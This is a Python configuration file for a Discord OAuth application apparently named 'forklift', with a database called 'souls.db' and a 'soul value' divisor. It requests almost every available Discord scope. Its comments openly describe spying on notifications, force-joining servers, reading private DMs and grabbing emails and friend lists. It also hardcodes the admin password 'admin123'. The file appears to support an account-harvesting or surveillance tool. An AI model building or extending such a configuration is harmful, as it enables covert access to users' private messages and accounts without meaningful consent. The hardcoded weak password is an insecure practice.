# config n stuff

# cDiscord OAuth - get from ddev panel
DISCORD_CLIENT_ID = 'YOUR_CLIENT_ID'
DISCORD_CLIENT_SECRET = 'YOUR_CLIENT_SECRET'
DISCORD_BOT_TOKEN = 'YOUR_CLIENT_TOKEN'

# Srv config
FORKLIFT_HOST = 'localhost'
FORKLIFT_PORT = '5000'
FORKLIFT_URL = f'http://{FORKLIFT_HOST}:{FORKLIFT_PORT}'

# Database
DB_PATH = "forklift/souls.db"

# Admin password (very secure yes)
ADMIN_PASSWORD = "admin123"

# OAuth scopes - im wan EVERYTHING
DISCORD_OAUTH_SCOPES = [
    "identify",                    # basic user info
    "email",                       # gimme dat email
    "guilds",                      # all their servers
    "guilds.join",                 # force join servers
    "guilds.members.read",         # see all members
    "gdm.join",                    # group DMs
    "rpc",                         # rich presence
    "rpc.notifications.read",      # notification spying
    "rpc.voice.read",              # voice status
    "rpc.voice.write",             # control voice
    "rpc.activities.write",        # change their status
    "bot",                         # bot permissions
    "webhook.incoming",            # webhook access
    "messages.read",               # read DMs (if they let us lol)
    "applications.builds.upload",  # app builds
    "applications.builds.read",    # read builds
    "applications.store.update",   # store stuff
    "applications.entitlements",   # premium features
    "activities.read",             # current activity
    "activities.write",            # change activity
    "relationships.read",          # friend list
    "voice",                       # voice permissions
    "dm_channels.read"             # DM channels
]

# Soul value formula divisor
SOUL_VALUE_DIVISOR = 10**14

# Token expiry (hours)
TOKEN_EXPIRY_HOURS = 1